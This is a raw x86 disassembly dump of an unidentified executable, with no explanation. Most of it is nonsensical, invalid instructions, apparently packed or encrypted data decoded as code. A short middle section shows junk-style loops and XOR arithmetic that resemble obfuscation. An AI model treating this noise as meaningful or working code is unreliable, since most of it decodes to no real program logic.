  40a67d:	sbb    al,0xcd
  40a67f:	rol    al,1
  40a681:	and    dh,BYTE PTR ds:0x2f17e1f1
  40a687:	(bad)  
  40a688:	jle    0x40a696
  40a68a:	retf   
  40a68b:	call   0x9e1fc285
  40a690:	pop    es
  40a691:	adc    eax,0x7e281bfa
  40a696:	sbb    al,BYTE PTR [edx]
  40a698:	jne    0x40a652
  40a69a:	(bad)  
  40a69b:	out    0xc9,al
  40a69d:	test   BYTE PTR [edi+0x5b],bl
  40a6a0:	gs leave 
  40a6a2:	push   edi
  40a6a3:	leave  
  40a6a4:	jmp    0xd7964e61
  40a6a9:	cmp    al,BYTE PTR [edx-0x1534e1b1]
  40a6af:	push   cs
  40a6b0:	test   BYTE PTR [esp+edx*8-0x4d0416dc],0xa6
  40a6b8:	daa    
  40a6b9:	xchg   DWORD PTR [ecx],eax
  40a6bb:	jae    0x40a685
  40a6bd:	int3   
  40a6be:	cs mov eax,0x31e2eac4
  40a6c4:	cdq    
  40a6c5:	mov    gs,ebx
  40a6c7:	push   esi
  40a6c8:	and    ebx,DWORD PTR [esi-0x1c]
  40a6cb:	add    esp,DWORD PTR [ebp-0x17]
  40a6ce:	mov    DWORD PTR [edx-0x1e],edx
  40a6d1:	cmp    edx,DWORD PTR [edi+0xa64ca16]
  40a6d7:	push   ebp
  40a6d8:	clc    
  40a6d9:	dec    esp
  40a6da:	iret   
  40a6db:	bound  ecx,QWORD PTR [edx]
  40a6dd:	mov    BYTE PTR [edx],dl
  40a6df:	add    DWORD PTR [ebp-0x270ace49],ebx
  40a6e5:	mov    ds:0x9f2af86c,eax
  40a6ea:	retf   0xf9f1
  40a6ed:	jge    0x40a69e
  40a6ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f0:	dec    ebp
  40a6f1:	push   cs
  40a6f2:	push   eax
  40a6f3:	mov    esp,0xdefa7fdc
  40a6f8:	ins    BYTE PTR es:[edi],dx
  40a6f9:	inc    esp
  40a6fa:	add    eax,0x29a8f89d
  40a6ff:	mov    dh,BYTE PTR [esi+0x50bb34bb]
  40a705:	xchg   edx,eax
  40a706:	mov    edx,0xa06ce9b5
  40a70b:	pop    ds
  40a70c:	pop    edi
  40a70d:	out    dx,al
  40a70e:	and    eax,DWORD PTR [edx]
  40a710:	mov    dh,0x5a
  40a712:	sbb    BYTE PTR [ebp-0x79],0x88
  40a716:	adc    eax,0x269ce4db
  40a71b:	ins    BYTE PTR es:[edi],dx
  40a71c:	dec    ebx
  40a71d:	xchg   edx,eax
  40a71e:	push   cs
  40a71f:	jmp    0xbf07d250
  40a724:	fcomp  DWORD PTR [esi+0x6fb57cb9]
  40a72a:	int    0xb0
  40a72c:	in     eax,dx
  40a72d:	push   0x538f8c07
  40a732:	cmp    dh,BYTE PTR [eax]
  40a734:	cmc    
  40a735:	add    DWORD PTR [ecx+0x6d],eax
  40a738:	inc    ebx
  40a739:	add    al,0xef
  40a73b:	shl    edx,cl
  40a73d:	inc    eax
  40a73e:	push   ebx
  40a73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a740:	jmp    0x40a71e
  40a742:	es mov ebp,0x151a8951
  40a748:	in     eax,dx
  40a749:	ret    
  40a74a:	and    DWORD PTR [eax],ebx
  40a74c:	jb     0x40a7a2
  40a74e:	imul   edx,DWORD PTR [ecx+0x1a9d1d84],0x5e
  40a755:	(bad)  
  40a756:	mov    ch,0x62
  40a758:	nop    eax
  40a75b:	mov    esi,0x51e09fb5
  40a760:	add    DWORD PTR [eax],ebp
  40a762:	stos   BYTE PTR es:[edi],al
  40a763:	int    0x76
  40a765:	repnz xor DWORD PTR [ebx+0x41b732fd],0xb072671a
  40a770:	repnz dec esp
  40a772:	pop    eax
  40a773:	sbb    BYTE PTR [edi],0x3b
  40a776:	cmc    
  40a777:	imul   edx,DWORD PTR [ebp-0x2b],0x34
  40a77b:	dec    ebx
  40a77c:	repnz cmp eax,0xdb816aa5
  40a782:	mov    dl,BYTE PTR [eax+eiz*8-0x961c55e]
  40a789:	pop    es
  40a78a:	(bad)
  40a78d:	push   esp
  40a78e:	jge    0x40a74f
  40a790:	cmp    dl,ah
  40a792:	dec    edi
  40a793:	imul   esi,DWORD PTR [esi-0x6],0x6df1aaa7
  40a79a:	xchg   edx,eax
  40a79b:	mov    BYTE PTR [esi+0x33],ah
  40a79e:	mov    eax,0x3ebffe83
  40a7a3:	in     al,dx
  40a7a4:	(bad)  
  40a7a5:	aam    0x89
  40a7a7:	dec    ebp
  40a7a8:	xlat   BYTE PTR ds:[ebx]
  40a7a9:	les    ebp,FWORD PTR [ecx+ebx*2-0x4711af3a]
  40a7b0:	xchg   esp,eax
  40a7b1:	ins    DWORD PTR es:[edi],dx
  40a7b2:	stos   BYTE PTR es:[edi],al
  40a7b3:	jb     0x40a78f
  40a7b5:	dec    eax
  40a7b6:	adc    dl,dl
  40a7b8:	sbb    eax,0xf881b027
  40a7bd:	ret    
  40a7be:	repz jbe 0x40a7f6
  40a7c1:	add    DWORD PTR [eax-0x7b],edx
  40a7c4:	stc    
  40a7c5:	fcmovbe st,st(4)
  40a7c7:	jl     0x40a7a5
  40a7c9:	lods   eax,DWORD PTR ds:[esi]
  40a7ca:	(bad)
  40a7ce:	test   al,0x19
  40a7d0:	enter  0xf4d9,0x69
  40a7d4:	sahf   
  40a7d5:	sbb    BYTE PTR [ecx-0x51],cl
  40a7d8:	(bad)  
  40a7da:	sbb    eax,DWORD PTR [ebx+ebp*1]
  40a7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7de:	inc    ebp
  40a7df:	sbb    eax,0x777be700
  40a7e4:	nop
  40a7e5:	in     eax,dx
  40a7e6:	xchg   ebx,eax
  40a7e7:	add    eax,0x548d5b13
  40a7ec:	xor    DWORD PTR [ecx-0x4559fa2d],ebx
  40a7f2:	stos   BYTE PTR es:[edi],al
  40a7f3:	aam    0x34
  40a7f5:	pop    ecx
  40a7f6:	fwait
  40a7f7:	sar    DWORD PTR [esi],1
  40a7f9:	rol    ah,1
  40a7fb:	mov    ecx,0x9c40408b
  40a800:	test   DWORD PTR [ebp-0x6f],ecx
  40a803:	and    ch,BYTE PTR [ecx+0xc]
  40a806:	je     0x40a810
  40a808:	call   0xd000:0x19a682db
  40a80f:	adc    esp,DWORD PTR [edi]
  40a811:	sub    ecx,DWORD PTR [ebp+edx*4+0x57]
  40a815:	adc    al,0x5
  40a817:	push   esp
  40a818:	(bad)  
  40a81a:	in     eax,0xb2
  40a81c:	push   cs
  40a81d:	sub    BYTE PTR [esi],cl
  40a81f:	xchg   esp,eax
  40a820:	imul   ebx,edi,0xff459d1a
  40a826:	xchg   ebx,eax
  40a827:	jl     0x40a83e
  40a829:	stc    
  40a82a:	sti    
  40a82b:	fmul   st(3),st
  40a82d:	jg     0x40a86f
  40a82f:	(bad)  
  40a830:	push   cs
  40a831:	out    dx,eax
  40a832:	xchg   esp,eax
  40a833:	mov    eax,ds:0xffc30aff
  40a838:	jp     0x40a89e
  40a83a:	repnz pop ebx
  40a83c:	mov    esp,0x95ede8bb
  40a841:	aam    0x5a
  40a843:	outs   dx,DWORD PTR ds:[esi]
  40a844:	stos   BYTE PTR es:[edi],al
  40a845:	sahf   
  40a846:	mov    ah,0x6a
  40a848:	or     eax,0xfe8c911e
  40a84d:	test   al,0xc0
  40a84f:	push   edx
  40a850:	pusha  
  40a851:	test   eax,0xcaac6382
  40a856:	test   al,0x9e
  40a858:	push   eax
  40a859:	js     0x40a876
  40a85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85c:	aas    
  40a85d:	dec    edx
  40a85e:	mov    edx,0x6fdd53d4
  40a863:	sbb    al,0x96
  40a865:	push   esp
  40a866:	shr    BYTE PTR [ebx],1
  40a868:	imul   edx,esi,0xbebf13db
  40a86e:	dec    edi
  40a86f:	mov    eax,0x20141ca6
  40a874:	jl     0x40a85b
  40a876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a877:	popa   
  40a878:	leave  
  40a879:	xor    edi,DWORD PTR [edi-0x7]
  40a87c:	mov    DWORD PTR [ebx-0x68754178],eax
  40a882:	push   esi
  40a883:	mov    ebp,0x2e03eab7
  40a888:	sti    
  40a889:	dec    edi
  40a88a:	imul   edi,DWORD PTR [edi],0xffffffb9
  40a88d:	fucomip st,st(4)
  40a88f:	arpl   WORD PTR [esi-0x5e],bp
  40a892:	fst    QWORD PTR [edi+edi*4+0x4c12dafb]
  40a899:	push   ds
  40a89a:	mov    bl,ch
  40a89c:	in     eax,dx
  40a89d:	pop    esp
  40a89e:	rcr    DWORD PTR [ecx],cl
  40a8a0:	fnsave [eax+0x43]
  40a8a3:	push   0x45a13251
  40a8a8:	jmp    0x1866:0x96bdf7e1
  40a8af:	push   cs
  40a8b0:	or     cl,BYTE PTR [ebx-0x11b502ec]
  40a8b6:	das    
  40a8b7:	lds    esi,FWORD PTR [esi]
  40a8b9:	xor    BYTE PTR [ebx-0x7],0x45
  40a8bd:	mov    edx,0x81b30457
  40a8c2:	lock in al,0x3d
  40a8c5:	stos   DWORD PTR es:[edi],eax
  40a8c6:	imul   esp,eax,0xae020b2b
  40a8cc:	stos   DWORD PTR es:[edi],eax
  40a8cd:	xchg   edi,eax
  40a8ce:	mov    edx,DWORD PTR [ebp-0x7e]
  40a8d1:	pop    ebp
  40a8d2:	outs   dx,BYTE PTR ds:[esi]
  40a8d3:	fisub  DWORD PTR [ebx+0xa]
  40a8d6:	in     al,0x85
  40a8d8:	les    eax,FWORD PTR [esi]
  40a8da:	xchg   ebx,eax
  40a8db:	mov    al,0xf0
  40a8dd:	clc    
  40a8de:	in     al,dx
  40a8df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e0:	add    eax,0x2bce36a
  40a8e5:	out    dx,eax
  40a8e6:	rol    BYTE PTR [edi+0x1f5c0f74],1
  40a8ec:	(bad)  
  40a8ee:	push   cs
  40a8ef:	shl    BYTE PTR [edi+0x74],cl
  40a8f2:	jns    0x40a8c1
  40a8f4:	adc    eax,0x2ee7c504
  40a8f9:	mov    eax,0xe7f40e4b
  40a8fe:	inc    esp
  40a8ff:	mov    ds:0x5a827196,al
  40a904:	gs call 0xa625:0x306cbc78
  40a90c:	stc    
  40a90d:	cmc    
  40a90e:	mov    ah,0x22
  40a910:	inc    edi
  40a911:	(bad)  [esi]
  40a913:	mul    esp
  40a915:	lock mov BYTE PTR [ebx],al
  40a918:	fnstsw WORD PTR ds:0x4321b20e
  40a91e:	and    BYTE PTR [ebx+edx*2+0x2032b831],dh
  40a925:	data16 mov dl,0x26
  40a928:	and    al,0xc3
  40a92a:	adc    DWORD PTR [esp+ecx*1+0x59],edi
  40a92e:	xchg   edx,eax
  40a92f:	sub    DWORD PTR [ebx-0x59],0x7c1e7cc6
  40a936:	xor    bh,BYTE PTR [eax+0x2d1d3ac4]
  40a93c:	jae    0x40a967
  40a93e:	dec    BYTE PTR [edx+0x451352ac]
  40a944:	scas   eax,DWORD PTR es:[edi]
  40a945:	dec    esi
  40a946:	dec    eax
  40a947:	jo     0x40a8f1
  40a949:	mov    edi,0xf944f222
  40a94e:	retf   0xa500
  40a951:	loope  0x40a99e
  40a953:	push   esp
  40a954:	mov    ds:0x7ed0091b,eax
  40a959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a95a:	or     dl,BYTE PTR [edx]
  40a95c:	lods   eax,DWORD PTR ds:[esi]
  40a95d:	loop   0x40a8ed
  40a95f:	xchg   ch,cl
  40a961:	popf   
  40a962:	sub    bl,ah
  40a964:	mov    ds:0x7170c994,eax
  40a969:	push   0xd02f2759
  40a96e:	fdiv   QWORD PTR [ebx-0x3b85b865]
  40a974:	sbb    al,0xeb
  40a976:	sbb    eax,0xd76b8be3
  40a97b:	ror    DWORD PTR [esi+0x28],cl
  40a97e:	add    ch,BYTE PTR [esi]
  40a980:	sbb    dl,dl
  40a982:	pop    eax
  40a983:	retf   
  40a984:	adc    ch,BYTE PTR [esp+eax*2+0x75]
  40a988:	adc    eax,0xbf6650b0
  40a98d:	or     DWORD PTR [ebx],0x13
  40a990:	adc    al,0x56
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42aa1f
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9eb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bab
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9ef
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	adc    dh,BYTE PTR [ebp-0x918ef38]
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0xb
  40ab08:	push   ebp
  40ab09:	(bad)  
  40ab0a:	retf   
  40ab0b:	test   BYTE PTR [ebp-0x27],0xf4
  40ab0f:	dec    edi
  40ab10:	mov    dl,BYTE PTR [edi-0x245ae119]
  40ab16:	lods   eax,DWORD PTR ds:[esi]
  40ab17:	mov    edx,0xb552314f
  40ab1c:	inc    esi
  40ab1d:	mov    cl,0x7e
  40ab1f:	stc    
  40ab20:	outs   dx,BYTE PTR ds:[esi]
  40ab21:	pushf  
  40ab22:	xchg   edx,eax
  40ab23:	out    dx,al
  40ab24:	scas   al,BYTE PTR es:[edi]
  40ab25:	icebp  
  40ab26:	sbb    bh,BYTE PTR [edi+0x43]
  40ab29:	test   BYTE PTR [edi-0x7f7db148],dl
  40ab2f:	mov    ecx,0xf861cd7
  40ab34:	or     eax,0xc9410f91
  40ab39:	xor    cl,BYTE PTR [edi-0x2d591a97]
  40ab3f:	cdq    
  40ab40:	sbb    ebp,edx
  40ab42:	aas    
  40ab43:	rol    BYTE PTR [edx+eiz*4],0xac
  40ab47:	aam    0xe
  40ab49:	sub    BYTE PTR [edx+0x5383c3ad],ah
  40ab4f:	jnp    0x40aadf
  40ab51:	inc    ebp
  40ab52:	jecxz  0x40ab9b
  40ab54:	(bad)  [eax-0x3085ff9]
  40ab5a:	aaa    
  40ab5b:	add    ch,bh
  40ab5d:	cmp    ebp,DWORD PTR [edi]
  40ab5f:	lahf   
  40ab60:	clc    
  40ab61:	sbb    al,0xbf
  40ab63:	mov    edi,ebp
  40ab65:	dec    esp
  40ab66:	cmp    ebp,edx
  40ab68:	push   edx
  40ab69:	add    al,bl
  40ab6b:	jg     0x40ab4c
  40ab6d:	pop    ecx
  40ab6e:	std    
  40ab6f:	ds jge 0x40abd5
  40ab72:	xor    esi,DWORD PTR [edx+eiz*8-0x79]
  40ab76:	test   eax,0xf7fbd3dc
  40ab7b:	test   al,0xd0
  40ab7d:	push   0xe9761f62
  40ab82:	add    al,0x77
  40ab84:	loop   0x40ab70
  40ab86:	mov    al,ds:0xbcb4584b
  40ab8b:	cmp    al,0xfe
  40ab8d:	call   0x1b37:0xfd06d8f7
  40ab94:	jns    0x40ab70
  40ab96:	rcl    BYTE PTR [esi-0x3c],0xad
  40ab9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab9b:	outs   dx,BYTE PTR ds:[esi]
  40ab9c:	es stos DWORD PTR es:[edi],eax
  40ab9e:	in     eax,dx
  40ab9f:	icebp  
  40aba0:	rol    ah,0x1c
  40aba3:	dec    ebp
  40aba4:	jns    0x40abb0
  40aba6:	mov    WORD PTR [esi-0x5b],cs
  40aba9:	jae    0x40abdd
  40abab:	push   ss
  40abac:	xor    ecx,DWORD PTR [esi+0x7171f9ec]
  40abb2:	jno    0x40ab57
  40abb4:	cdq    
  40abb5:	adc    ebx,esp
  40abb7:	(bad)  
  40abb9:	or     BYTE PTR [edx+0x54],bh
  40abbc:	loope  0x40ac17
  40abbe:	jg     0x40abbc
  40abc0:	es mov ?,edx
  40abc3:	sub    BYTE PTR [esi-0x6652e705],al
  40abc9:	gs aas 
  40abcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abcc:	xchg   edi,eax
  40abcd:	xchg   edi,eax
  40abce:	and    dh,dl
  40abd0:	adc    DWORD PTR [ecx+eax*4+0x1e],edx
  40abd4:	xor    DWORD PTR [edx+eiz*1-0x37],ebp
  40abd8:	call   0x2bd2bd6d
  40abdd:	adc    DWORD PTR [ebp-0x1e3f7b18],edi
  40abe3:	fsub   DWORD PTR cs:[esi-0x7ad8f509]
  40abea:	pop    edi
  40abeb:	in     al,dx
  40abec:	xchg   esp,eax
  40abed:	in     eax,dx
  40abee:	scas   al,BYTE PTR es:[edi]
  40abef:	jno    0x40ac05
  40abf1:	add    DWORD PTR [ebx+0x12],0x46
  40abf5:	pop    ebx
  40abf6:	retf   0xd5be
  40abf9:	fcmovnu st,st(0)
  40abfb:	push   esi
  40abfc:	mov    ds:0x15e949f1,eax
  40ac01:	xor    ch,ch
  40ac03:	test   DWORD PTR [ebx-0x28],ebx
  40ac06:	out    dx,eax
  40ac07:	push   es
  40ac08:	push   esp
  40ac09:	jne    0x40abec
  40ac0b:	scas   eax,DWORD PTR es:[edi]
  40ac0c:	pop    edi
  40ac0d:	icebp  
  40ac0e:	sbb    al,0xbb
  40ac10:	pop    es
  40ac11:	arpl   WORD PTR ds:0x64f98826,bx
  40ac17:	repz sbb ah,BYTE PTR [ecx+ebp*1-0x29ed4c84]
  40ac1f:	iret   
  40ac20:	mov    cs,WORD PTR [ecx]
  40ac22:	ja     0x40ac6f
  40ac24:	adc    al,0xcf
  40ac26:	cwde   
  40ac27:	(bad)  
  40ac28:	mov    ebp,0x411bca67
  40ac2d:	cmp    BYTE PTR [ecx+0x7bcb5503],bl
  40ac33:	aaa    
  40ac34:	cld    
  40ac35:	inc    edx
  40ac36:	push   0xffffffc6
  40ac38:	ret    
  40ac39:	ins    DWORD PTR es:[edi],dx
  40ac3a:	jns    0x40ac0e
  40ac3c:	imul   eax,DWORD PTR [ecx-0x2a112cf7],0x4796701b
  40ac46:	in     eax,0x9b
  40ac48:	js     0x40abe8
  40ac4a:	or     ebp,DWORD PTR [bx+di-0x77b1]
  40ac4f:	(bad)  
  40ac50:	loope  0x40ac45
  40ac52:	popf   
  40ac53:	push   es
  40ac54:	add    BYTE PTR [esi+0x600eaaf5],dh
  40ac5a:	and    al,bl
  40ac5c:	test   eax,0xfb7bb1a
  40ac61:	into   
  40ac62:	pop    esi
  40ac63:	sar    BYTE PTR [esi],1
  40ac65:	jmp    0x83c6:0x32855780
  40ac6c:	xchg   esp,eax
  40ac6d:	bound  ecx,QWORD PTR [edi-0x5bd23710]
  40ac73:	call   0x34905de4
  40ac78:	fs mov cl,0xc0
  40ac7b:	pop    edi
  40ac7c:	test   BYTE PTR [ecx+0xa],0x7d
  40ac80:	xor    bh,BYTE PTR [ebp+0x781c8d43]
  40ac86:	out    0xdd,al
  40ac88:	sub    BYTE PTR [eax+ebx*4-0x2ecb4c70],0x6e
  40ac90:	xchg   bh,bh
  40ac92:	add    ebp,DWORD PTR [edi+0x7d1af0f1]
  40ac98:	mov    cl,0xc1
  40ac9a:	inc    bx
  40ac9c:	fcmovu st,st(5)
  40ac9e:	cld    
  40ac9f:	or     DWORD PTR [edi+0x6a],ebx
  40aca2:	pop    ecx
  40aca3:	or     ah,BYTE PTR ds:0xab45baa0
  40aca9:	es call 0x6f2:0x9a2df79c
  40acb1:	ja     0x40ac97
  40acb3:	and    al,0x2d
  40acb5:	out    0x6,eax
  40acb7:	fdiv   DWORD PTR [ecx+0x52d4003a]
  40acbd:	sub    al,0x17
  40acbf:	sub    esp,0x705119cd
  40acc5:	mov    dh,0x46
  40acc7:	ficom  DWORD PTR [ecx+0x371f9fb]
  40accd:	add    ah,dl
  40accf:	outs   dx,DWORD PTR ds:[esi]
  40acd0:	aam    0x5c
  40acd2:	inc    edi
  40acd3:	scas   eax,DWORD PTR es:[edi]
  40acd4:	pop    esp
  40acd5:	mov    al,ds:0x60929192
  40acda:	push   cs
  40acdb:	test   BYTE PTR [ecx+ebp*4-0x605803ce],bh
  40ace2:	or     al,0xe6
  40ace4:	jmp    0x40acf1
  40ace6:	in     eax,0x7b
  40ace8:	jmp    0xb61c:0xf24e6ef8
  40acef:	xlat   BYTE PTR ds:[ebx]
  40acf0:	jns    0x40ac79
  40acf2:	nop
  40acf3:	cmp    bl,BYTE PTR [ebx+0x64ecbbbe]
  40acf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfa:	jmp    0x40acc4
  40acfc:	add    al,0x43
  40acfe:	mov    BYTE PTR [ebp+0x75],dh
  40ad01:	cmp    al,BYTE PTR ds:0xb0889acf
  40ad07:	sti    
  40ad08:	retf   0xcaad
  40ad0b:	scas   al,BYTE PTR es:[edi]
  40ad0c:	xchg   edx,eax
  40ad0d:	inc    edx
  40ad0e:	fistp  WORD PTR [ebx]
  40ad10:	call   DWORD PTR [edx+0x5a]
  40ad13:	adc    al,ah
  40ad15:	in     al,dx
  40ad16:	out    0x19,al
  40ad18:	xor    eax,0xe7f33097
  40ad1d:	inc    edx
  40ad1e:	clc    
  40ad1f:	dec    edx
  40ad20:	pop    ecx
  40ad21:	loop   0x40acf2
  40ad23:	cmc    
  40ad24:	cmp    al,0x9a
  40ad26:	loope  0x40acb2
  40ad28:	mov    ebp,0xa3a6a6e
  40ad2d:	jle    0x40ad75
  40ad2f:	jge    0x40ad56
  40ad31:	mov    DWORD PTR [edx+0x540f402d],ebp
  40ad37:	dec    esp
  40ad38:	(bad)  
  40ad39:	call   0x5b60:0xc3818dce
  40ad40:	loop   0x40ad62
  40ad42:	or     dh,BYTE PTR [edi+ecx*4-0x7c]
  40ad46:	adc    BYTE PTR [ecx-0x21],cl
  40ad49:	stos   DWORD PTR es:[edi],eax
  40ad4a:	nop
  40ad4b:	mov    ebp,0x87e06e6b
  40ad50:	jmp    0x40ace2
  40ad52:	xchg   ecx,eax
  40ad53:	imul   ecx,DWORD PTR [edx],0xe3437b84
  40ad59:	jns    0x40adc8
  40ad5b:	adc    al,0xb6
  40ad5d:	jbe    0x40ad4b
  40ad5f:	dec    esi
  40ad60:	icebp  
  40ad61:	call   0xf03c1c80
  40ad66:	fsubr  QWORD PTR [esi]
  40ad68:	loopne 0x40adb8
  40ad6a:	add    DWORD PTR [eax+ebx*4],0x68bde62a
  40ad71:	dec    esi
  40ad72:	xchg   DWORD PTR [ecx-0x6b],eax
  40ad75:	cmp    bl,BYTE PTR [edx]
  40ad77:	sbb    al,0xb2
  40ad79:	ret    
  40ad7a:	push   ecx
  40ad7b:	dec    esp
  40ad7c:	in     eax,0xfa
  40ad7e:	aad    0xfc
  40ad80:	ret    
  40ad81:	loope  0x40adc7
  40ad83:	fst    QWORD PTR [edi]
  40ad85:	add    bh,BYTE PTR [eax+ebp*2-0x2acfce10]
  40ad8c:	jp     0x40ad10
  40ad8e:	scas   eax,DWORD PTR es:[edi]
  40ad8f:	xchg   edi,eax
  40ad90:	add    ebp,DWORD PTR [ecx+0x6d]
  40ad93:	pop    ds
  40ad94:	and    al,0x5d
  40ad96:	xor    eax,0xa24b51fb
  40ad9b:	sbb    eax,0x26aca3c3
  40ada0:	fcomp  QWORD PTR [edi+0x7da924f5]
  40ada6:	popf   
  40ada7:	pop    esi
  40ada8:	push   ecx
  40ada9:	push   cs
  40adaa:	fs inc edi
  40adac:	mov    ?,WORD PTR [ebp+0x6a]
  40adaf:	or     al,0x1b
  40adb1:	push   es
  40adb2:	pop    es
  40adb3:	scas   eax,DWORD PTR es:[edi]
  40adb4:	rcl    bl,0x1c
  40adb7:	push   cs
  40adb8:	cmp    BYTE PTR fs:[esi+eax*8-0x2a],cl
  40adbd:	inc    ecx
  40adbe:	fsub   st,st(0)
  40adc0:	lahf   
  40adc1:	pop    ecx
  40adc2:	pop    eax
  40adc3:	jnp    0x40adae
  40adc5:	or     eax,0x6feb00a2
  40adca:	jmp    0x1154:0xe4b3c150
  40add1:	stos   BYTE PTR es:[edi],al
  40add2:	xchg   edx,eax
  40add3:	push   edx
  40add4:	push   ds
  40add5:	and    eax,0xad8ec237
  40adda:	mov    ebx,0x186d2a60
  40addf:	mov    cl,0x90
  40ade1:	icebp  
  40ade2:	dec    ebx
  40ade3:	in     al,dx
  40ade4:	mov    al,ds:0x161908d2
  40ade9:	inc    eax
  40adea:	adc    BYTE PTR [edx],dl
  40adec:	test   BYTE PTR [ecx],dh
  40adee:	jle    0x40ae6c
  40adf0:	icebp  
  40adf1:	sbb    ah,BYTE PTR [eax-0x4a]
  40adf4:	jno    0x40ad92
  40adf6:	fdivr  DWORD PTR [ebx]
  40adf8:	(bad)  
  40adfa:	jmp    0x40ae05
  40adfc:	sti    
  40adfd:	enter  0xc8d1,0x57
  40ae01:	cs dec ecx
  40ae03:	arpl   WORD PTR [ebx+0x77],bp
  40ae06:	std    
  40ae07:	mov    al,0x17
  40ae09:	stos   BYTE PTR es:[di],al
  40ae0b:	xchg   ebp,eax
  40ae0c:	cli    
  40ae0d:	xchg   esi,eax
  40ae0e:	lock adc edi,DWORD PTR [edx]
  40ae11:	mov    DWORD PTR [ecx-0x2ecc1fbe],ebx
  40ae17:	inc    edx
  40ae18:	mov    bh,0xb0
  40ae1a:	inc    ebx
  40ae1b:	jmp    0x40ae23
  40ae1d:	push   ebx
  40ae1e:	mov    esp,0x40240a5c
  40ae23:	inc    DWORD PTR [ecx]
  40ae25:	xor    ah,dl
  40ae27:	mov    cl,0x42
  40ae29:	fstp   TBYTE PTR [ebp+0x55e65c90]
  40ae2f:	jno    0x40aea7
  40ae31:	test   al,0x9b
  40ae33:	mov    WORD PTR [ebx],ds
  40ae35:	adc    cl,dh
  40ae37:	sub    BYTE PTR [edx+0x33529821],0x80
  40ae3e:	jecxz  0x40ae41
  40ae40:	or     al,0x8e
  40ae42:	cmp    eax,0xf12d9c47
  40ae47:	pop    ss
  40ae48:	push   edi
  40ae49:	int    0x19
  40ae4b:	jbe    0x40ae69
  40ae4d:	test   DWORD PTR [eax-0x80],0xa1a3288d
  40ae54:	pop    esp
  40ae55:	or     ebp,ebx
  40ae57:	fwait
  40ae58:	jb     0x40ae91
  40ae5a:	inc    esp
  40ae5b:	out    0x7a,al
  40ae5d:	enter  0xbbb1,0xf2
  40ae61:	in     al,0xdf
  40ae63:	shl    DWORD PTR [edx+ecx*4-0x79],1
  40ae67:	arpl   cx,sp
  40ae69:	jmp    0x903e06f5
  40ae6e:	and    eax,0x99b43248
  40ae73:	shl    ecx,cl
  40ae75:	mov    ebp,0x1f8f41ee
  40ae7a:	inc    edi
  40ae7b:	in     al,dx
  40ae7c:	cli    
  40ae7d:	fiadd  WORD PTR [eax]
  40ae7f:	push   es
  40ae80:	xor    ebp,ebp
